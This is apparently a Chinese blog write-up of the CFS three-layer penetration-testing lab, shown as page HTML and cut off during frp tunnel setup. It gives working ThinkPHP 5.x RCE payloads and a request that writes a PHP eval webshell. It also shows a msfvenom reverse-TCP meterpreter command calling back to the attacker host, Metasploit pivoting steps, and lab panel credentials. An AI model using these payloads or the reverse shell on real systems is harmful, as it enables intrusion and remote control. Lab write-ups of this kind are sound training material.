@@ -1,0 +1,443 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>CFS三层靶机 | admire@</title><meta name="author" content="admire@"><meta name="copyright" content="admire@"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="centos7service network restart systemctl restart networkvim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33  &#x2F;etc&#x2F;resolv.conf 网络拓扑图    初始配置12rootteamssix.com  target1登陆宝塔后台 添加默认站点 http:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CFS三层靶机">
+<meta property="og:url" content="http://example.com/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:site_name" content="admire@">
+<meta property="og:description" content="centos7service network restart systemctl restart networkvim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33  &#x2F;etc&#x2F;resolv.conf 网络拓扑图    初始配置12rootteamssix.com  target1登陆宝塔后台 添加默认站点 http:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.webp">
+<meta property="article:published_time" content="2024-04-16T11:22:00.000Z">
+<meta property="article:modified_time" content="2024-04-16T11:22:09.990Z">
+<meta property="article:author" content="admire@">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CFS三层靶机',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-16 19:22:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="admire@" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="admire@"><span class="site-name">admire@</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CFS三层靶机</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-16T11:22:00.000Z" title="发表于 2024-04-16 19:22:00">2024-04-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-16T11:22:09.990Z" title="更新于 2024-04-16 19:22:09">2024-04-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CFS三层靶机"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>centos7<br>service network restart</p>
+<p>systemctl restart network<br>vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33</p>
+<p> <code>/etc/resolv.conf</code></p>
+<h1 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h1><img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411175236097.png" class="" title="image-20240411175236097">
+
+
+
+<h1 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">teamssix.com</span><br></pre></td></tr></table></figure>
+
+<p>target1登陆宝塔后台 添加默认站点</p>
+<p>http:&#x2F;&#x2F;你的IP:8888&#x2F;a768f109&#x2F;</p>
+<p>账号：eaj3yhsl<br>密码：41bb8fee</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411165340180.png" class="" title="image-20240411165340180">
+
+
+
+<p>给target要添加一个net网卡更改完删去</p>
+<p>target2也同理，账号密码如下</p>
+<blockquote>
+<p>地址：http:&#x2F;&#x2F;你的IP:8888&#x2F;2cc52ec0&#x2F;<br>账号：xdynr37d<br>密码：123qwe..</p>
+</blockquote>
+<h1 id="target1"><a href="#target1" class="headerlink" title="target1"></a>target1</h1><p>使用nmap 的ping协议探测内网存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.6.0/24</span><br></pre></td></tr></table></figure>
+
+<p>或者使用fscan探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 192.168.6.0/24 &gt;1.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 192.168.6.1     is alive</span><br><span class="line">(icmp) Target 192.168.6.11    is alive</span><br><span class="line">(icmp) Target 192.168.6.142   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">192.168.6.1:135 open</span><br><span class="line">192.168.6.11:80 open</span><br><span class="line">192.168.6.11:22 open</span><br><span class="line">192.168.6.142:8080 open</span><br><span class="line">192.168.6.1:7680 open</span><br><span class="line">192.168.6.11:21 open</span><br><span class="line">192.168.6.1:139 open</span><br><span class="line">192.168.6.142:8000 open</span><br><span class="line">192.168.6.1:445 open</span><br><span class="line">192.168.6.11:8888 open</span><br><span class="line">192.168.6.11:888 open</span><br><span class="line">192.168.6.11:3306 open</span><br><span class="line">[*] alive ports len is: 12</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.6.1</span><br><span class="line">   [-&gt;]LAPTOP-588CKRDN</span><br><span class="line">   [-&gt;]192.168.6.1</span><br><span class="line">   [-&gt;]192.168.11.1</span><br><span class="line">   [-&gt;]192.168.22.1</span><br><span class="line">   [-&gt;]192.168.33.1</span><br><span class="line">   [-&gt;]10.204.196.15</span><br><span class="line">[*] WebTitle: http://192.168.6.11       code:200 len:1326   title:没有找到站点</span><br><span class="line">[*] WebTitle: http://192.168.6.11:888   code:404 len:548    title:404 Not Found</span><br><span class="line">[*] WebTitle: http://192.168.6.142:8080 code:302 len:35     title:None 跳转url: http://192.168.6.142:8080/login/index</span><br><span class="line">[*] WebTitle: http://192.168.6.142:8000 code:404 len:182    title:nps error</span><br><span class="line">[*] WebTitle: http://192.168.6.142:8080/login/index code:200 len:3617   title:None</span><br><span class="line">[*] WebTitle: http://192.168.6.11:8888  code:302 len:219    title:Redirecting... 跳转url: http://192.168.6.11:8888/login</span><br><span class="line">[*] WebTitle: http://192.168.6.11:8888/login code:200 len:946    title:安全入口校验失败</span><br><span class="line">[+] http://192.168.6.142:8080 poc-yaml-nps-default-password </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>端口扫描</p>
+<p>可以使用nmap 利用SYN扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sY -p- 192.168.6.11</span><br></pre></td></tr></table></figure>
+
+<p>或者使用御剑端口扫描</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411163355956.png" class="" title="image-20240411163355956">
+
+
+
+
+
+<p>观察是thinkphp5.0的框架</p>
+<p>在 ThinkPHP 5.x 中造成rce有两种原因：<br>1.路由对控制器名控制不严谨导致的RCE；<br>2.Request类对调用方法控制不严加上变量覆盖导致RCE</p>
+<ul>
+<li>ThinkPHP 5.0.5-5.0.22</li>
+<li>ThinkPHP 5.1.0-5.1.30</li>
+</ul>
+<p>理解该漏洞的关键在于理解ThinkPHP5的路由处理方式。ThinkPHP5的路由处理方式主要分为有配置路由和未配置路由的情况，在未配置路由的情况，ThinkPHP5将通过以下格式解析URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>
+
+<h2 id="控制器名未过滤导致RCE"><a href="#控制器名未过滤导致RCE" class="headerlink" title="控制器名未过滤导致RCE"></a>控制器名未过滤导致RCE</h2><p>理解该漏洞的关键在于理解ThinkPHP5的路由处理方式。ThinkPHP5的路由处理方式主要分为有配置路由和未配置路由的情况，在未配置路由的情况，ThinkPHP5将通过以下格式解析URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>function</code>为反射调用的函数，<code>vars[0]</code>为传入的回调函数，<code>vars[1][]</code>为参数为回调函数的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>提前看下5.0.23的修复情况，找到对应的commit，对传入的控制器名做了限制</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240319090100649.png" class="" title="image-20240319090100649">
+
+
+
+<p>本次漏洞就产生在未匹配到路由情况下，使用兼容模式解析url时，通过构造特殊URL，调用意外的控制器中敏感函数，从而执行敏感操作</p>
+<p>该函数通过 <code>ReflectionFunction()</code>反射调用程序中的函数，这就是一个很好利用的点，我们通过该函数可以调用系统中的各种敏感函数。</p>
+<p>找到利用点了，现在就需要来构造poc，首先触发点在 <code>thinkphp/library/think/App.php</code>中的 <code>invokeFunction</code>，我们需要构造url格式为 <code>模块\控制器\操作</code></p>
+<p>模块我们用默认模块<code>index</code>即可，首先大多数网站都有这个模块，而且每个模块都会加载<code>app.php</code>文件，无须担心模块的选择</p>
+<p>该文件的命名空间为 <code>think</code>，类名为 <code>app</code>，我们的控制器便可以构造成 <code>\think\app</code>。因为ThinkPHP使用的自动加载机制会识别命名空间，这么构造是没有问题的。</p>
+<p>操作直接为<code>invokeFunction</code>，没有疑问</p>
+<p>参数方面，我们首先要触发第一个调用函数，简化一下代码再分析一下:</p>
+<p>第一行确定 $class 就是我们传入的控制器 <code>\think\app</code>实例化后的对象</p>
+<p>第二行绑定我们的方法，也就是invokefunction</p>
+<p>第三方就可以调用这个方法了，其中$args是我们的参数，通过url构造，将会传入到invokefunction中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);</span><br><span class="line">$reflect = new \ReflectionMethod($class, $method[1]);</span><br><span class="line">return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);</span><br></pre></td></tr></table></figure>
+
+<p>然后就进入我们的invokefunctio，该函数需要什么参数，我们就构造什么参数，首先构造一个调用函数function&#x3D;call_user_func_array</p>
+<p>call_user_func_array需要两个参数，第一个参数为函数名，第二个参数为数组，<code>var[0]=system,var[1][0]=id</code></p>
+<p>这里因为两次反射一次回调调用需要好好捋一捋。。。。</p>
+<h2 id="核心类-Request-远程代码漏洞"><a href="#核心类-Request-远程代码漏洞" class="headerlink" title="核心类 Request 远程代码漏洞"></a>核心类 Request 远程代码漏洞</h2><p>在漏洞版本范围内，主要分为完整版和核心版</p>
+<p>核心版在debug模式下会调用param() 和 method() ，在非debug模式下无法利用，poc如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;get[]=whoami</span><br><span class="line">or </span><br><span class="line">_method=__construct&amp;filter[]=system&amp;route[]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>完整版因为<strong>vendor目录</strong>下具有Captcha模块，通过自动加载Captcha模块可以直接调用param() 和 method()，所以完整版可以直接利用poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=system&amp;get[]=ipconfig</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>thinkphp&#x2F;library&#x2F;think&#x2F;Request.php:518</p>
+</blockquote>
+<ul>
+<li>在<code>method</code>方法中，默认<code>$method=false</code>和config配置文件的伪装变量 <code>&#39;var_method&#39;=&#39;_methd&#39;</code>会跳到第二个if代码块</li>
+<li><code>$_POST[&#39;_method&#39;]</code>将被赋值给 <code>this-&gt;method</code>，中间并没有做过滤</li>
+<li>然后是一个动态调用的结构，<code>$_POST</code>的值直接被传入到动态函数<code>$_this-&gt;&#123;$_POST[&#39;_method&#39;]&#125;()</code>中</li>
+</ul>
+<p>通过对<code>method()</code>方法的代码分析，我们可以&#x3D;&#x3D;控制<code>Request</code>类中的方法，传入函数的参数也可控&#x3D;&#x3D;</p>
+<p>现在则需要找到 <code>method()</code>方法的调用链</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/1632556908_614ed76c42489e6d4d1b4.png!small" class="" title="图片.png">
+
+<p>先来看官方的修复，对 <code>$_POST[&#39;_method&#39;]</code>做了白名单限制，使其只能调用允许的方法</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/1632556928_614ed78041160736aa7f8.png!small" class="" title="图片.png">
+
+<p>光有上面的问题代码还是不够的，在本次漏洞中还有一个关键函数 <code>__construct()</code>，通过 <code>method()</code>方调用 <code>__construct()</code>可以覆盖类中的属性值</p>
+<p>该函数通过 <code>property_exists()</code>判断传入的参数是否为该类中存在的属性，如果是，则赋值</p>
+<p>通过该功能，我们能覆盖程序中本来的值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$options</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$item</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;filter)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;default_filter&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存 php://input</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;input = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240319174645764.png" class="" title="image-20240319174645764">
+
+
+
+<p>通过探测两种rce均可以实现</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411172457284.png" class="" title="image-20240411172457284">
+
+<p>手动写webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C%3Fphp%20eval(%24_POST%5B&#x27;a&#x27;%5D)%3B%3F%3E%0A</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411173326961.png" class="" title="image-20240411173326961">
+
+
+
+<p>蚁剑连接</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411173341290.png" class="" title="image-20240411173341290">
+
+
+
+
+
+<p>内网信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP adder</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411173433172.png" class="" title="image-20240411173433172">
+
+
+
+<p>发现另一个网卡</p>
+<p>上传fscan扫描内网的存活主机</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411175413637.png" class="" title="image-20240411175413637">
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411175054804.png" class="" title="image-20240411175054804">
+
+<h2 id="建立路由"><a href="#建立路由" class="headerlink" title="建立路由"></a>建立路由</h2><p>msfvenom生成木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.6.142 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt; options</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411201252979.png" class="" title="image-20240411201252979">
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411201229117.png" class="" title="image-20240411201229117">
+
+
+
+<p><strong>添加路由</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">这一步也可以使用run post/multi/manage/autoroute自动添加路由</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411203025091.png" class="" title="image-20240411203025091">
+
+
+
+<h2 id="上传frp进行内网穿透"><a href="#上传frp进行内网穿透" class="headerlink" title="上传frp进行内网穿透"></a>上传frp进行内网穿透</h2><p>启动服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.toml</span><br></pre></td></tr></table></figure>
+
+<p>frps.toml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
+
+<p>启动客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<p>frpc.toml</p>
